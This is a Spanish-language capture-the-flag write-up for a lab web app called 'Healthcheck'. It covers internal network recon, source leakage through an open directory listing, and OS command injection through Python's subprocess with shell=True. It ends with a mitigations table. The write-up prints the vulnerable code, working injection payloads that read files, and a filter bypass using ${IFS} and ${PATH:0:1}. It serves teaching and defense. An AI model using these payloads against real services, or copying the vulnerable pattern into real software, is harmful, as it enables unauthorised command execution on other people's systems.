---
id: healthcheck
sidebar_position: 2
title: "Healthcheck"
tags: [avanzado, web-hacking, command-injection, rce, analisis-de-codigo]
---

# Healthcheck

| Campo | Valor |
|-------|-------|
| **Categoría** | Web Hacking |
| **Dificultad** | 🔴 Avanzado |
| **Herramientas** | curl, bash, análisis de código Python |
| **Concepto clave** | OS Command Injection — `subprocess` con `shell=True` |
| **TTP** | Command and Scripting Interpreter (T1059) |

## Enunciado

> Obtain the server's flag.

**Infraestructura del ejercicio:**

| Rol | IP | Puerto | Credenciales |
|-----|----|--------|--------------|
| Aplicación web (`p1`) | `192.168.200.100` | 3000 | — |
| Servidor de archivos (`fileserver`) | `192.168.200.200` | 80 | — |
| Máquina de trabajo (Debian 12) | `192.168.200.51` | — | asignadas por INICTEL |

---

## Escenario

Un CTF suele soltarte en medio de la acción sin decirte cómo llegaste ahí. Antes de tocar
comandos, vale la pena situar este ejercicio en una historia realista — porque el valor no
está solo en capturar el flag, sino en entender **en qué momento de un ataque real harías
esto**.

Imagina una empresa cualquiera. Un empleado abre un adjunto de un correo de *phishing* y, sin
saberlo, le da al atacante una sesión en su equipo: la **máquina de trabajo `192.168.200.51`**,
un host Linux dentro de la red interna. El atacante ya está *dentro*, pero en un rincón sin
valor: una workstation de usuario. Su objetivo real —servidores, datos, credenciales— está más
adentro. Lo que hará desde aquí es **reconocimiento interno** y **movimiento lateral**: mirar
qué otros hosts alcanza, qué servicios corren, y cuál de ellos tiene una grieta que lo lleve
más lejos.

**Ahí es donde tomamos el hilo de este CTF: ya tenemos ese punto de apoyo (*foothold*) en la
workstation, y desde él pivotaremos.** El *ping sweep*, el escaneo de puertos y todo lo que
sigue es, exactamente, lo que un adversario haría en la fase de *Actions on Objectives* de la
cadena de ataque:

```
   FASES 1–6  ·  fuera del alcance del CTF            FASE 7  ·  aquí empezamos
 ┌────────────────────────────────────────────┐    ┌──────────────────────────────┐
 │ 1 Reconnaissance  →  2 Weaponization        │    │ 7 Actions on Objectives      │
 │ 3 Delivery        →  4 Exploitation         │ ═▶ │   🎯 foothold en .51          │
 │ 5 Installation    →  6 Command & Control    │    │   recon interno · lateral ·  │
 │                                             │    │   escalar hacia el objetivo  │
 └────────────────────────────────────────────┘    └──────────────────────────────┘
    cómo el atacante llegó a la workstation            lo que hace desde ella
                                                       ── este CTF ──
```

Las fases 1 a 6 de la **Cyber Kill Chain** (el modelo de Lockheed Martin: `Reconnaissance →
Weaponization → Delivery → Exploitation → Installation → Command & Control`) ya ocurrieron: así
llegó el atacante a la workstation. Nosotros arrancamos en la fase 7, **Actions on Objectives**,
con la workstation como base de operaciones.

:::note[Escenario representativo, no un incidente real]

La historia del phishing es un marco pedagógico para darle contexto operativo al ejercicio —
no un ataque documentado concreto. Pero las técnicas sí son reales y están catalogadas en
**MITRE ATT&CK**: el recon interno, el movimiento lateral y —lo que explotaremos más
adelante— la ejecución de comandos vía una app vulnerable (`T1059 — Command and Scripting
Interpreter`). El escenario es ficticio; los TTPs, no.

:::

---

## Reconocimiento

### Paso 0 — Descubrir la red

Empezamos sin conocer las IPs ni los puertos de los servidores del ejercicio: solo sabemos
que nuestra máquina de trabajo es `192.168.200.51`, así que el resto de la red es
`192.168.200.0/24`.

**Hosts vivos** — un *ping sweep* en paralelo, guardado a un archivo para reutilizarlo:

```bash
seq 1 254 | xargs -P64 -I{} sh -c 'ping -c1 -W1 192.168.200.{} >/dev/null 2>&1 && echo 192.168.200.{}' | sort -t. -k4 -n > hosts.txt
cat hosts.txt
```

```
192.168.200.2
192.168.200.51
192.168.200.100
192.168.200.200
```

- `192.168.200.2` — la puerta de enlace de la red (router).
- `192.168.200.51` — nuestra propia máquina de trabajo.
- `192.168.200.100` y `192.168.200.200` — los dos candidatos.

<details>
<summary>🔍 Explica el comando — <code>ping sweep</code> en paralelo</summary>

```bash
seq 1 254 | xargs -P64 -I{} sh -c 'ping -c1 -W1 192.168.200.{} >/dev/null 2>&1 && echo 192.168.200.{}' | sort -t. -k4 -n > hosts.txt
```

Se lee de izquierda a derecha, pieza por pieza:

| Pieza | Qué hace |
|-------|----------|
| `seq 1 254` | Genera los números `1`…`254` (uno por línea): los últimos octetos de la `/24`. |
| <code>&#124;</code> | El *pipe* pasa esa lista de números a la entrada del siguiente comando. |
| `xargs -P64` | Toma cada línea de entrada y ejecuta un comando con ella; `-P64` corre **64 en paralelo**. |
| `-I{}` | Define `{}` como el hueco donde `xargs` inserta cada número. |
| `sh -c '…'` | Cada invocación abre un mini-shell para correr el `ping` con ese octeto. |
| `ping -c1 -W1` | **Un** paquete (`-c1`), esperando **máximo 1 s** (`-W1`). Sin límites, 254 pings colgados tardarían minutos. |
| `>/dev/null 2>&1` | Descarta la salida del `ping` (no nos interesa el detalle, solo si respondió). |
| `&& echo …` | El `&&` solo ejecuta el `echo` **si el `ping` tuvo éxito** → imprime la IP únicamente de los hosts vivos. |
| <code>&#124; sort -t. -k4 -n</code> | Ordena por el **4.º campo** (`-k4`) usando `.` como separador (`-t.`), numéricamente (`-n`) → IPs en orden. |
| `> hosts.txt` | Guarda el resultado en un archivo para **reutilizarlo** en el escaneo de puertos. |

**La intuición (el patrón que se repite):** *generar candidatos → paralelizar → quedarse solo
con los que responden → ordenar*. Casi todo el recon con one-liners sigue esta forma. `xargs -P`
es el motor: convierte un bucle secuencial lento en un abanico paralelo.

**Ejercicio de refuerzo:** ¿cómo adaptarías el comando para barrer la red `10.10.5.0/24`? ¿Y
si quisieras el doble de velocidad — qué número cambias, y qué riesgo tiene subirlo demasiado?
(Pista: más paralelismo = más carga en tu propia máquina y más "ruido" en la red).

</details>

**Puertos abiertos** — escaneamos cada host descubierto (leyendo `hosts.txt`) con `/dev/tcp`
de bash, sin instalar nada:

```bash
while read -r h; do
  seq 1 10000 | xargs -P200 -I{} bash -c "timeout 1 bash -c 'echo >/dev/tcp/$h/{}' 2>/dev/null && echo $h:{}"
done < hosts.txt | sort -t: -k1,1 -k2,2n
```

```
192.168.200.2:53
192.168.200.51:22
192.168.200.51:80
192.168.200.100:3000
192.168.200.200:80
```

<details>
<summary>🔍 Explica el comando — escaneo de puertos con <code>/dev/tcp</code></summary>

```bash
while read -r h; do
  seq 1 10000 | xargs -P200 -I{} bash -c "timeout 1 bash -c 'echo >/dev/tcp/$h/{}' 2>/dev/null && echo $h:{}"
done < hosts.txt | sort -t: -k1,1 -k2,2n
```

| Pieza | Qué hace |
|-------|----------|
| `while read -r h; … done < hosts.txt` | Recorre el archivo **línea por línea**: cada `h` es una de las IPs vivas que descubrimos. Reutiliza el trabajo del paso anterior en vez de re-escribir las IPs a mano. |
| `seq 1 10000` | Genera los puertos `1`…`10000` a probar en cada host. |
| `xargs -P200 -I{}` | Prueba **200 puertos en paralelo** (`{}` = cada número de puerto). |
| `echo >/dev/tcp/$h/{}` | **El truco clave.** `/dev/tcp/HOST/PUERTO` es un pseudo-archivo de **bash**: abrirlo *intenta una conexión TCP*. Si el puerto está abierto, tiene éxito; si está cerrado, falla. |
| `timeout 1` | Corta el intento tras 1 s — sin esto, cada puerto cerrado se quedaría colgado esperando. |
| `2>/dev/null && echo $h:{}` | Silencia los errores de los puertos cerrados; el `&&` imprime `IP:puerto` **solo si la conexión abrió**. |
| `sort -t: -k1,1 -k2,2n` | Ordena por IP (`-k1`) y luego por puerto numérico (`-k2n`), usando `:` como separador. |

**Por qué `bash -c` y no `sh -c`:** `/dev/tcp` **es una característica de bash**, no existe en
`sh` ni en POSIX. Si el escaneo corriera bajo `sh`, `/dev/tcp` sería un archivo inexistente y
todo fallaría. Por eso el comando envuelve explícitamente el intento en `bash -c`.

**El patrón, otra vez:** *tomar la lista del paso anterior → generar candidatos (puertos) →
paralelizar → quedarse con los que responden → ordenar*. Es el mismo esqueleto que el ping
sweep; solo cambia qué "abre" el candidato (aquí, una conexión TCP en vez de un `ping`).

:::tip[Con `nmap` instalado es más simple]
`nmap -p- --min-rate 2000 -iL hosts.txt` hace lo mismo (`-iL` lee los hosts del archivo).
Ojo: **el puerto 3000 no está en el top-1000 que nmap escanea por defecto** — un `nmap 192.168.200.100`
a secas *se perdería la app*. Por eso barremos el rango completo (`-p-` o `seq 1 10000`), nunca
solo los puertos comunes. La versión con `/dev/tcp` sirve cuando no puedes instalar nmap.
:::

**Ejercicio de refuerzo:** el `while read` recorre TODOS los hosts de `hosts.txt`, incluida
nuestra propia máquina (`.51`). ¿Cómo excluirías tu propia IP del escaneo? (Pista: `grep -v`
sobre `hosts.txt` antes del bucle).

</details>

- `192.168.200.2:53` — DNS del router, no es objetivo.
- `192.168.200.51:22` y `:80` — nuestra propia máquina (SSH y un servidor local).
- **`192.168.200.100:3000`** — un servicio web en un puerto **no estándar**: candidato principal.
- **`192.168.200.200:80`** — un servidor HTTP.

Ahora sí tenemos, obtenidos por nosotros mismos, los dos objetivos: `100:3000` y `200:80`.

**¿Por qué un puerto no estándar llama la atención?** Los servicios "normales" viven en puertos
conocidos: web en 80/443, SSH en 22, DNS en 53. Un servicio en un puerto raro como **3000**
significa que *alguien lo puso ahí a propósito* — y eso es interesante en los dos mundos:

- **En un pentest real:** los puertos no estándar suelen alojar aplicaciones de desarrollo,
  paneles internos o de administración, APIs improvisadas — software que a menudo está **menos
  endurecido** que la web pública principal (sin WAF, con debug activado, sin revisar). Es
  justo donde aparecen las grietas.
- **En un CTF:** el servicio del reto casi siempre se despliega en un puerto llamativo. Un
  `:3000` abierto es una señal directa de "el ejercicio vive aquí".

En ambos casos la conclusión es la misma: un puerto abierto fuera de lo común **merece
inspección prioritaria**.

:::caution[Punto ciego del pipeline]
Escaneamos puertos **solo** sobre los hosts que el ping sweep encontró (`hosts.txt`). Si un
host sirviera HTTP pero **bloqueara ICMP**, el ping sweep no lo vería y nunca llegaríamos a
escanear sus puertos. Aquí ICMP está permitido, pero en una red real conviene complementar con
un barrido de puertos directo (sin depender del ping) sobre todo el rango.
:::

### Paso 1 — Fingerprinting del stack

*Fingerprinting* (tomar la "huella digital") es identificar qué software corre detrás de un
servicio antes de atacarlo. Con los dos objetivos, averiguamos qué hay en cada uno:

```bash
curl -sI http://192.168.200.100:3000/
```

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.13.3
Content-Type: text/html; charset=utf-8
```

<details>
<summary>🔍 Explica el comando — <code>curl -sI</code></summary>

| Pieza | Qué hace |
|-------|----------|
| `curl` | Cliente HTTP de línea de comandos: hace peticiones y muestra la respuesta. |
| `-s` | *Silent*: oculta la barra de progreso y los mensajes de estado — deja la salida limpia. |
| `-I` | Pide **solo las cabeceras** (una petición HTTP `HEAD`), no el cuerpo de la página. |

**El porqué:** en *fingerprinting* miramos las cabeceras **primero** porque son pequeñas y
suelen delatar el software en la cabecera `Server:` — sin necesidad de descargar todo el HTML.
Es la forma más rápida y silenciosa de saber "¿qué corre aquí?" antes de profundizar.

**Ejercicio de refuerzo:** ¿qué comando usarías si quisieras ver **además** el cuerpo de la
página junto con las cabeceras? (Pista: `curl -i` en minúscula hace justo eso; compara `-I`
mayúscula vs `-i` minúscula).

</details>

**Leyendo la huella — ¿qué nos dice ese `Server:`?**

- **Qué es "el stack".** Es la pila de capas de software que sostiene la app: el **lenguaje**
  (aquí Python), el **framework** web (Flask) y el **servidor** que atiende las conexiones
  (Werkzeug). Identificar el stack es el objetivo del fingerprinting.
- **Cómo lo encontramos.** La cabecera `Server: Werkzeug/3.1.3 Python/3.13.3` lo dice
  directamente. No siempre es tan explícita, pero cuando lo es, es un regalo.
- **Qué es Werkzeug/Flask.** **Flask** es un framework web de Python; **Werkzeug** es su
  servidor de desarrollo incorporado. Verlo en producción es en sí una señal: es un servidor
  pensado para *desarrollo*, no para exponerse a atacantes.
- **Python, no Node.js — por qué importaba.** El puerto `3000` es el default de **Express**
  (el framework web de **Node.js**), así que a primera vista uno pensaría "esto es Node". La
  cabecera lo desmiente: es Python. Confiar en el puerto habría llevado a un modelo mental
  equivocado.
- **Por qué el stack decide todo lo demás.** Cada stack tiene su propio catálogo de
  vulnerabilidades. Saber que es Flask/Python **poda el árbol de vectores**: descartamos lo que
  no aplica y priorizamos lo que sí.
  - ❌ **Descartamos webshells `.php`**: PHP no se ejecuta en un servidor Python. Subir un
    `shell.php` no serviría de nada — nadie lo interpretaría.
  - ✅ **Ponemos en el radar** lo típico de Flask: **Jinja2 SSTI** (inyección de plantillas),
    la **consola del debugger de Werkzeug** (RCE si `debug=True`) y **command injection**.

El servidor de archivos revela otra cosa:

```bash
curl -sI http://192.168.200.200/
```

```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.10
```

Es `python -m http.server` con **listado de directorios** activo. Guardamos ese dato: un
listado abierto suele filtrar código fuente.

### Paso 2 — Encontrar el formulario

El cuerpo de la página principal contiene:

```html
<form action="/send" method="GET">
  <h2>SEND HEALTHCHECK</h2>
  <input type="text" name="url" placeholder="ex) https://www.google.com">
  <button type="submit">Send</button>
</form>
```

Un campo `url`, método GET, ruta `/send`. La aplicación se llama **Healthcheck**.

### Paso 3 — Observar el comportamiento real

La hipótesis inicial es SSRF (el campo pide una URL). La probamos:

```bash
curl -s "http://192.168.200.100:3000/send?url=http://192.168.200.200/"
```

La respuesta en el bloque de resultado:

```
Execution Result
PING 192.168.200.200 (192.168.200.200) 56(84) bytes of data.
64 bytes from 192.168.200.200: icmp_seq=1 ttl=64 time=3.94 ms
--- 192.168.200.200 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss
```

Esto **no es SSRF** — el servidor no descargó una página, ejecutó `ping` contra el host de
la URL. La aplicación es un envoltorio de `ping`. Dos pruebas más afinan el modelo:

```bash
curl -s "http://192.168.200.100:3000/send?url=file:///etc/passwd"   # -> "Invalid"
curl -s "http://192.168.200.100:3000/send?url=http://127.0.0.1:3000/" # -> ping: 127.0.0.1:3000: Name or service not known
```

- `file://` es rechazado con `Invalid` → hay un filtro basado en el esquema.
- `http://127.0.0.1:3000/` pasa el host `127.0.0.1:3000` tal cual a `ping` → confirma que el
  host de la URL se inyecta en un comando del sistema.

Si el servidor construye una línea de shell con nuestra entrada, el vector es **OS Command
Injection**, no SSRF.

### Paso 4 — Filtrar el código fuente

El listado de directorios del fileserver nos deja leer la aplicación completa:

```bash
curl -s http://192.168.200.200/1/eng/for_user/app.py
```

Pasamos de caja negra a caja blanca. Con la fuente, el punto de inyección deja de ser una
suposición.

---

## Teoría

### ¿Qué es OS Command Injection?

**OS Command Injection** ocurre cuando una aplicación construye un comando del sistema
operativo concatenando entrada del usuario, y esa entrada se interpreta como parte de la
sintaxis del shell en lugar de como un dato. El atacante inserta metacaracteres del shell
(`;`, `|`, `&&`, `` ` ``, `$()`) para ejecutar comandos arbitrarios con los privilegios del
proceso web.

### El anti-patrón: `subprocess` con `shell=True`

En Python, la diferencia entre seguro e inseguro es una sola bandera:

```python
# VULNERABLE — shell=True interpreta la cadena completa como un comando de shell
command = f"ping {host} -c 1"
subprocess.Popen(command, shell=True)

# SEGURO — shell=False (default) + lista de argumentos:
# 'host' es SIEMPRE un solo argumento, nunca sintaxis de shell
subprocess.Popen(["ping", host, "-c", "1"])
```

Con `shell=True`, la cadena `ping 8.8.8.8;id -c 1` se ejecuta a través de `/bin/sh -c`, que
ve el `;` como separador de comandos y corre `id`. Con `shell=False` y una lista, `host`
vale literalmente `8.8.8.8;id` — un nombre de host inválido, no un comando.

### El código vulnerable, línea por línea

```python
def is_safe_input(host):
    safe_pattern = re.compile(r'^[a-zA-Z0-9_\-\.]+$')   # allowlist estricta
    return safe_pattern.match(host) is not None

def check_url(url):
    regex = re.compile(r'^(https?://)([^/]+)')   # host = todo hasta el primer "/"
    match = regex.match(url)
    if match:
        protocol = match.group(1)
        host = match.group(2)
        if protocol == 'https://':
            if is_safe_input(host):     # (1) la validación SOLO existe aquí
                return host
            else:
                return "Invalid"
        return host                     # (2) rama http:// -> devuelve host SIN validar
    else:
        return "Invalid"

def healthcheck(host):
    command = f"ping {host} -c 1"
    subprocess.Popen(command, shell=True, ...)   # (3) shell=True + interpolación cruda
```

Tres fallos encadenados:

1. **Validación en la rama equivocada.** `is_safe_input` — una allowlist que bloquea todos
   los metacaracteres del shell — solo se ejecuta cuando el protocolo es `https://`.
2. **Bypass trivial por protocolo.** Con `http://`, la función devuelve el host **sin
   ninguna validación**. El atacante simplemente elige `http://` en vez de `https://`.
3. **Ejecución con `shell=True`.** El host no validado se interpola en `ping {host} -c 1`
   y se pasa a un shell.

La única barrera que sobrevive es la del propio regex: el host se captura como `[^/]+`, así
que **no puede contener el carácter `/`**. Es la restricción con la que hay que convivir.

### Por qué `file://` fallaba y `http://` funciona

El regex ancla en `^(https?://)`. `file:///etc/passwd` no empieza por `http://` ni
`https://`, así que `check_url` cae al `else` y devuelve `"Invalid"`. La misma coincidencia
de esquema que rechaza `file://` es la que deja pasar `http://` sin filtrar. La defensa y el
agujero comparten la misma línea.

---

## Explotación

### Paso 1 — Un helper para leer el resultado

El resultado del comando vuelve dentro de un `<div class="result">`. Esta función extrae solo
ese bloque y le quita las etiquetas HTML:

```bash
T=http://192.168.200.100:3000
show(){ curl -s "$T/send?url=$1" | sed -n '/class="result"/,/<\/div>/p' | sed 's/<[^>]*>//g'; }
```

### Paso 2 — Confirmar la ejecución de comandos

Construimos un payload que:

- usa el protocolo `http://` para esquivar `is_safe_input`,
- inyecta con `;` para terminar el `ping` y encadenar comandos,
- **no usa `/`** (lo prohíbe el regex `[^/]+`).

El espacio se codifica como `%20`. Payload: `http://;id;pwd;ls;`

```bash
show 'http://%3Bid%3Bpwd%3Bls%3B'
```

```
Execution Result
uid=1000(python) gid=1000(python) groups=1000(python)
/app
app.py
flag
requirements.txt
templates
ping: usage error: Destination address required
/bin/sh: 1: -c: not found
```

El comando que corrió en el servidor fue `ping ;id;pwd;ls; -c 1`:

- `ping ` sin host → `usage error` (inofensivo, es la parte que descartamos).
- `id` → ejecutamos como el usuario **`python`**.
- `pwd` → el directorio de trabajo es **`/app`**.
- `ls` → el directorio contiene un archivo llamado **`flag`**.
- ` -c 1` → sobra al final → `-c: not found` (inofensivo).

### Paso 3 — Leer el flag

El flag está en el cwd (`/app/flag`), así que lo referenciamos por nombre relativo —
**sin necesidad de `/`**. Solo hay que sortear el espacio de `cat flag` con `%20`:

```bash
show 'http://%3Bcat%20flag%3B'
```

```
Execution Result
flag_3c462f978e95e26eb2a50235903f82e4a09c5ab95decfac4aec8c58e8fef7915
```

## Flag

```
flag_3c462f978e95e26eb2a50235903f82e4a09c5ab95decfac4aec8c58e8fef7915
```

---

<details>
<summary>💬 El desarrollador SÍ escribió una función de validación (`is_safe_input`) con una allowlist correcta. ¿Por qué no sirvió de nada?</summary>

Porque la colocó dentro del `if protocol == 'https://'`. La validación solo se ejecuta en el
camino que el atacante nunca elige. El código "seguro" existe, pero está en la rama
equivocada. Lección: validar la entrada debe ser **incondicional**, no depender de un camino
"de confianza" que el atacante controla.

</details>

<details>
<summary>💬 El regex captura el host como <code>[^/]+</code>, así que el payload no puede contener <code>/</code>. Si el flag hubiera estado en <code>/root/flag</code> en vez de en el cwd, ¿cómo lo leerías?</summary>

Construyendo cada `/` sin teclearlo. `${PATH:0:1}` expande al primer carácter de la variable
`PATH`, que siempre empieza en `/`. El payload sería:

```
cat${IFS}${PATH:0:1}root${PATH:0:1}flag
```

`${IFS}` produce el espacio y `${PATH:0:1}` produce cada `/`. Ninguno de los dos caracteres
prohibidos aparece literalmente en la entrada.

</details>

<details>
<summary>💬 ¿Por qué la respuesta a <code>file:///etc/passwd</code> fue "Invalid" pero <code>http://;cat flag;</code> funcionó, si ambos intentan leer archivos del servidor?</summary>

El filtro es de **esquema**, no de contenido. `check_url` exige que la URL empiece por
`http://` o `https://`; `file://` no matchea y cae al `else` → `"Invalid"`. `http://` sí
matchea, y como no es `https://`, se salta la validación. El ataque no lee el archivo con un
esquema de URL — abusa del comando `ping` para ejecutar `cat`.

</details>

---

## ¿Qué aprendimos?

- **El nombre del campo no define el vector.** "url", "Healthcheck", "image upload" — todas
  sugerían SSRF. El comportamiento real (`ping`) reveló command injection. Confirma siempre
  con la salida, no con la etiqueta.
- **`shell=True` con entrada de usuario es RCE esperando a pasar.** La forma segura es
  `shell=False` + lista de argumentos, donde la entrada nunca es sintaxis de shell.
- **La validación condicional es tan buena como su condición.** Un filtro perfecto en la
  rama que el atacante evita no protege nada.
- **Un listado de directorios abierto convierte caja negra en caja blanca.** Leer `app.py`
  transformó un ataque a ciegas en uno guiado por la fuente.
- **Los filtros de caracteres se sortean con expansión del shell.** `${IFS}` sustituye
  espacios y `${PATH:0:1}` produce `/` — sin usar los caracteres prohibidos.

:::note[Callejón sin salida explorado]

La primera hipótesis fue **SSRF**: el campo pedía una URL, idéntico al ejercicio *My
WebView*. Se descartó al ver que la respuesta era la salida de `ping`, no el cuerpo de una
página descargada. También se probó `file:///etc/passwd` esperando lectura de archivos vía
esquema de URL — devolvió `"Invalid"`, porque el filtro exige prefijo `http(s)://`. El vector
real no era la URL en sí, sino el comando que la procesaba.

:::

---

## Mitigaciones

| Medida | Descripción |
|--------|-------------|
| **Nunca usar `shell=True` con entrada de usuario** | Usar `subprocess.Popen(["ping", host, "-c", "1"])` — la entrada es un argumento, no sintaxis de shell |
| **Validación incondicional** | Aplicar la allowlist a TODA entrada, no solo a una rama de protocolo |
| **Validar el destino, no el esquema** | Comprobar que `host` es una IP o dominio válido (`ipaddress`, `socket.gethostbyname`) antes de usarlo |
| **Principio de mínimo privilegio** | El proceso web corre como `python` (uid 1000), no como root — limita el daño, pero no lo evita |
| **No exponer el código fuente** | Deshabilitar el listado de directorios del servidor de archivos; no publicar `app.py` en una ruta accesible |
